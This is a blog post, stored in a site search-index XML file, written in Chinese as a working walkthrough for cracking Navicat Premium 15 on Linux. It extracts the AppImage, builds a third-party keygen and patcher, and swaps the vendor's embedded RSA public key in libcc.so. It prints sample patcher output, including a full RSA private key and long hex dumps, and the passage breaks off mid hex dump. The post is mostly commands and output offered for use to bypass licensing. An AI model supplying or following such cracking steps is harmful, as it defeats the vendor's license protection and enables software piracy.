<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Linux下激活navicat15</title>
    <link href="/2020/03/23/2020-03-23-crack-navicat-15-for-linux/"/>
    <url>/2020/03/23/2020-03-23-crack-navicat-15-for-linux/</url>
    
    <content type="html"><![CDATA[<p>Linux下激活navicat15</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote><p>Navicat 是香港卓软数字科技有限公司生产的一系列 MySQL、MariaDB、MongoDB、Oracle、SQLite、PostgreSQL 及 Microsoft SQL Server 的图形化数据库管理及发展软件。它有一个类似浏览器的图形用户界面，支持多重连线到本地和远程数据库。它的设计合乎各种用户的需求，从数据库管理员和程序员，到各种为客户服务并与合作伙伴共享信息的不同企业或公司。   –wikipedia</p></blockquote><p>Navicat这个工具很强大,方便IT人员日常对数据库进行管理，但是由于自己太穷，所以买不起正版授权，从网上看到有大佬放出patch，根据大佬提供的wiki和patch源码，在自己的本机成功激活Navicat15,这里只是在记录自己激活的步骤，有条件还是去买个永久版吧。</p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><h3 id="下载navicat。"><a href="#下载navicat。" class="headerlink" title="下载navicat。"></a>下载navicat。</h3><p>从<a href="https://www.navicat.com/en/download/navicat-premium" target="_blank" rel="noopener">官方网站</a>下载navicat,你会得到一个AppImage文件。例如 navicat15-premium-en.AppImage。<br>我假定这个AppImage文件在 ~/Desktop 文件夹下。</p><h3 id="提取AppImage文件"><a href="#提取AppImage文件" class="headerlink" title="提取AppImage文件"></a>提取AppImage文件</h3><p>提取AppImage文件里的所有文件到一个文件夹。例如：</p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>mkdir ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en<span class="hljs-variable">$ </span>sudo mount -o loop ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en.AppImage ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en<span class="hljs-variable">$ </span>cp -r ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en-patched<span class="hljs-variable">$ </span>sudo umount ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en<span class="hljs-variable">$ </span>rm -rf ~<span class="hljs-regexp">/Desktop/navicat</span>15-premium-en</code></pre><p>这里主要目的是从AppImage中提取文件，放到~/Desktop/navicat15-premium-en-patched目录中</p><h3 id="编译patcher和keygen"><a href="#编译patcher和keygen" class="headerlink" title="编译patcher和keygen"></a>编译patcher和keygen</h3><h3 id="编译准备"><a href="#编译准备" class="headerlink" title="编译准备"></a>编译准备</h3><p>1、请确保你安装了下面几个库：　</p><ul><li>capstone</li><li>keystone</li><li>rapidjson</li></ul><p>作者wiki上使用的Linux版本为Ubunut，我个人使用的是Archlinux，我这里就以Archlinux为例进行讲解patcher和keygen的编译,执行以下指令，直接安装对应依赖库：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S capstone keystone rapidjson</span></code></pre><p>2、确定你的gcc支持C++17特性。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><pre><code class="hljs gams"><span class="hljs-symbol">$</span> git clone -b linux --single-branch https:<span class="hljs-comment">//github.com/DoubleLabyrinth/navicat-keygen.git</span><span class="hljs-symbol">$</span> cd navicat-keygen<span class="hljs-symbol">$</span> make <span class="hljs-keyword">all</span></code></pre><p>如果编译成功，在navicat-keygen的bin目录下会生成navicat-keygen和navicat-patcher两个文件</p><p>###　使用 navicat-patcher 替换官方公钥<br>使用 navicat-patcher 替换官方公钥。</p><pre><code class="hljs fortran">Usage:    navicat-patcher [--dry-run] &lt;Navicat Installation Path&gt; [RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> Key <span class="hljs-keyword">File</span>]        [--dry-run]                   Run patcher without applying <span class="hljs-built_in">any</span> patches.                                      This <span class="hljs-keyword">parameter</span> is <span class="hljs-keyword">optional</span>.        &lt;Navicat Installation Path&gt;   Path to a directory <span class="hljs-keyword">where</span> Navicat locates                                      This <span class="hljs-keyword">parameter</span> must be specified.        [RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> Key <span class="hljs-keyword">File</span>]   Path to a PEM-<span class="hljs-keyword">format</span> RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">private</span> key <span class="hljs-keyword">file</span>.                                      This <span class="hljs-keyword">parameter</span> is <span class="hljs-keyword">optional</span>.</code></pre><p>例如：</p><pre><code class="hljs awk">$ .<span class="hljs-regexp">/bin/</span>navicat-patcher ~<span class="hljs-regexp">/Desktop/</span>navicat15-premium-en-patched</code></pre><p>Navicat Premium 15.0.8 Linux 英文版 已经通过测试。</p><p>下面是一份样例输出：</p><pre><code class="hljs angelscript">***********************************************************       Navicat Patcher (Linux) by @DoubleLabyrinth      **                  Version: <span class="hljs-number">1.0</span>                          ***********************************************************Press ENTER to <span class="hljs-keyword">continue</span> <span class="hljs-keyword">or</span> Ctrl + C to abort.[+] Try to open libcc.so ... Ok![+] PatchSolution0 ...... Ready to apply    RefSegment      =  <span class="hljs-number">1</span>    MachineCodeRva  =  <span class="hljs-number">0x000000000141fbf0</span>    PatchMarkOffset = +<span class="hljs-number">0x0000000002a25648</span>[*] Generating new RSA <span class="hljs-keyword">private</span> key, it may take a long time...[*] Your RSA <span class="hljs-keyword">private</span> key:    -----BEGIN RSA PRIVATE KEY-----    MIIEowIBAAKCAQEAwGklHmDx9hacVUjT94Ydpy/<span class="hljs-number">1</span>mTHJ7lJy6aGu84MjQDHBw4Ni    iNG+axcv0gi5RATceD0DTZdF/Mt2dklWwMfGi3Ztk3Axbnof/byDCEeriQ79bCEb    <span class="hljs-number">1</span>rPqiVmXH54wwS/<span class="hljs-number">6</span>kM8d+rQW/xx6WWndo8JvasPYApRjW9moxnOT4ylzvjw/AMzA    Nw0dPfNqRtdYcOflIvP3PvwFhaYqb9mk7LhnfBqUF4fKwnPwtnC+g2L8V2gPlHQb    NIOuxP7krX6lreEn1vK6E03doV1ZGs74ZYwcQGcb7RFPt/gVATzN/E8CILBq8pBt    O19Cpv44cvXY2fBDL9q5UauS4dqvI9EjAjFRvwIDAQABAoIBAEUQeMZivfc7PnpO    XednOJWeXWXTvUvSRHUgGBBIbgrI0WhAbMn3n4YJGJ0njHih1hFCtUDQn8qRrb/f    q0gfbWD57XMSvmuNYpZNaCs8rpHP059QcxGqGvGaOuiae52cfzAjZ/tpUSfZLQGT    Qn9Zd2y3R34FjXSWuEIjkl3jrywFDCoxtsVQKRBhJhprUgytRT4qlQlDkG4OcZ+T    GJP+TU1tqvv7bcP7vIEMTnkrIjyfYfUPNK+HIoV8obGHDWxVhlcvvxTvtd1IsFfF    hqvfeVdWWl5krWDCL1wME7ipY3N240rIXAlR9WQTMkNerr83IYM0OPeXja/vYPSz    <span class="hljs-number">8</span>gDPQQECgYEA8PNcCw/<span class="hljs-number">5</span>ok5iltWlvsdw/<span class="hljs-number">7</span>MHx/wIpo8a37Q6+Q2KZKeVnwEFgItd    <span class="hljs-number">6</span>QGSiEeVzlC8LcIMdpxzGET8Ky+IUMs6d0u+GkF7L2gAHOKmAf+<span class="hljs-number">8</span>N2zMIGBn255m    <span class="hljs-number">8</span>uvMmo8ZDRqdookJytNq9FhfBJ4XnuQ05AixG4OBjOvO+G6bAZ44NOECgYEAzG2q    KCBA5lGHF3v5RG4j8194XCSEQ5CnEUt6ijCBh/KnQSkR64ARzWlKhQzm9L5DbPBi    Zn2OlcDWBzaQnQVxbF43YrIwln1JaU+<span class="hljs-number">7</span>oc29CDq7OEQFTeiOkEcGbOv1RTJciUaI    FXAHeR5XOM8+DnPnrWT/<span class="hljs-number">9</span>NLnO/zIA8xyWLV9up8CgYAFricIV7sR2Xk3hxfeNIN0    c7sGOunVS2Bdz7joMCqIDu9XDUYc7qwrFw9mSRG+CGc3SPDURwHrm4y6U+eJyBC7    yTxVECAgUPpXs/wn5eiBAf6Z8MviAIz6wxZSunbjuTHoKATkFDHcSs0KpdN2uniI    u6+<span class="hljs-number">5</span>L1N5iAGcF7dtxVYb4QKBgFeLt00L0v9Pds0F2JAHovm8ruy27rWIoyNy8X1w    nGg98IalMflqlTUknDcyeU3ilTl4EIvXxVI4jO/<span class="hljs-number">13</span>CSCijpgdtObf9dSvDePX8lB    NGzryfWkm6jrqPH8mLHYsub5VEutmuWjXm/uIGhByE+kL1lAYaTVFRXJgVavHWEE    CF39AoGBAIni+wquohFgYTrCs8jhvHwK+llYqnDVjFCm4EetHPQpnAfr17/WSpI+    dJQHXd1mnLPSE0GxMa7uZSkQ82Ph/HBCJY+Ht/<span class="hljs-number">7</span>czo31Jws0nUUtOOCjTuoYHV5b    bYNak7aYKLsn1vDYSr9BqZp56p8ZLD9ObWXCJ6KifFd6n6iWKnz+    -----END RSA PRIVATE KEY-----[*] Your RSA <span class="hljs-keyword">public</span> key:    -----BEGIN PUBLIC KEY-----    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwGklHmDx9hacVUjT94Yd    py/<span class="hljs-number">1</span>mTHJ7lJy6aGu84MjQDHBw4NiiNG+axcv0gi5RATceD0DTZdF/Mt2dklWwMfG    i3Ztk3Axbnof/byDCEeriQ79bCEb1rPqiVmXH54wwS/<span class="hljs-number">6</span>kM8d+rQW/xx6WWndo8Jv    asPYApRjW9moxnOT4ylzvjw/AMzANw0dPfNqRtdYcOflIvP3PvwFhaYqb9mk7Lhn    fBqUF4fKwnPwtnC+g2L8V2gPlHQbNIOuxP7krX6lreEn1vK6E03doV1ZGs74ZYwc    QGcb7RFPt/gVATzN/E8CILBq8pBtO19Cpv44cvXY2fBDL9q5UauS4dqvI9EjAjFR    vwIDAQAB    -----END PUBLIC KEY-----********************************************************                   PatchSolution0                    ********************************************************[*] Previous:+<span class="hljs-number">0x0000000000000070</span>                          <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          ........+<span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000000000090</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">56</span> a2 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ........HV......+<span class="hljs-number">0x00000000000000a0</span>  <span class="hljs-number">48</span> <span class="hljs-number">56</span> a2 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  HV..............[*] After:+<span class="hljs-number">0x0000000000000070</span>                          <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          ........+<span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000000000090</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> d8 <span class="hljs-number">57</span> a2 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .........W......+<span class="hljs-number">0x00000000000000a0</span>  d8 <span class="hljs-number">57</span> a2 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  .W..............[*] Previous:+<span class="hljs-number">0x0000000002a25640</span>                          <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          ........+<span class="hljs-number">0x0000000002a25650</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25660</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25670</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25680</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25690</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256a0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256b0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256c0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256d0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256e0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a256f0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25700</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25710</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25720</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25730</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25740</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25750</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25760</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25770</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25780</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a25790</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a257a0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a257b0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a257c0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................+<span class="hljs-number">0x0000000002a257d0</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                          ........        [*] After:+<span class="hljs-number">0x0000000002a25640</span>                          ef be ad de <span class="hljs-number">4</span>d <span class="hljs-number">49</span> <span class="hljs-number">49</span> <span class="hljs-number">42</span>          ....MIIB+<span class="hljs-number">0x0000000002a25650</span>  <span class="hljs-number">49</span> <span class="hljs-number">6</span>a <span class="hljs-number">41</span> <span class="hljs-number">4</span>e <span class="hljs-number">42</span> <span class="hljs-number">67</span> <span class="hljs-number">6</span>b <span class="hljs-number">71</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>b <span class="hljs-number">69</span> <span class="hljs-number">47</span> <span class="hljs-number">39</span> <span class="hljs-number">77</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span>  IjANBgkqhkiG9w0B+<span class="hljs-number">0x0000000002a25660</span>  <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">41</span> <span class="hljs-number">4f</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">38</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>d <span class="hljs-number">49</span> <span class="hljs-number">49</span> <span class="hljs-number">42</span>  AQEFAAOCAQ8AMIIB+<span class="hljs-number">0x0000000002a25670</span>  <span class="hljs-number">43</span> <span class="hljs-number">67</span> <span class="hljs-number">4</span>b <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">45</span> <span class="hljs-number">41</span> <span class="hljs-number">77</span> <span class="hljs-number">47</span> <span class="hljs-number">6</span>b <span class="hljs-number">6</span>c <span class="hljs-number">48</span> <span class="hljs-number">6</span>d <span class="hljs-number">44</span> <span class="hljs-number">78</span>  CgKCAQEAwGklHmDx+<span class="hljs-number">0x0000000002a25680</span>  <span class="hljs-number">39</span> <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">56</span> <span class="hljs-number">55</span> <span class="hljs-number">6</span>a <span class="hljs-number">54</span> <span class="hljs-number">39</span> <span class="hljs-number">34</span> <span class="hljs-number">59</span> <span class="hljs-number">64</span> <span class="hljs-number">70</span> <span class="hljs-number">79</span> <span class="hljs-number">2f</span> <span class="hljs-number">31</span>  <span class="hljs-number">9</span>hacVUjT94Ydpy/<span class="hljs-number">1</span>+<span class="hljs-number">0x0000000002a25690</span>  <span class="hljs-number">6</span>d <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">4</span>a <span class="hljs-number">37</span> <span class="hljs-number">6</span>c <span class="hljs-number">4</span>a <span class="hljs-number">79</span> <span class="hljs-number">36</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">75</span> <span class="hljs-number">38</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>d <span class="hljs-number">6</span>a  mTHJ7lJy6aGu84Mj+<span class="hljs-number">0x0000000002a256a0</span>  <span class="hljs-number">51</span> <span class="hljs-number">44</span> <span class="hljs-number">48</span> <span class="hljs-number">42</span> <span class="hljs-number">77</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>e <span class="hljs-number">69</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>e <span class="hljs-number">47</span> <span class="hljs-number">2</span>b <span class="hljs-number">61</span> <span class="hljs-number">78</span> <span class="hljs-number">63</span> <span class="hljs-number">76</span>  QDHBw4NiiNG+axcv+<span class="hljs-number">0x0000000002a256b0</span>  <span class="hljs-number">30</span> <span class="hljs-number">67</span> <span class="hljs-number">69</span> <span class="hljs-number">35</span> <span class="hljs-number">52</span> <span class="hljs-number">41</span> <span class="hljs-number">54</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">44</span> <span class="hljs-number">30</span> <span class="hljs-number">44</span> <span class="hljs-number">54</span> <span class="hljs-number">5</span>a <span 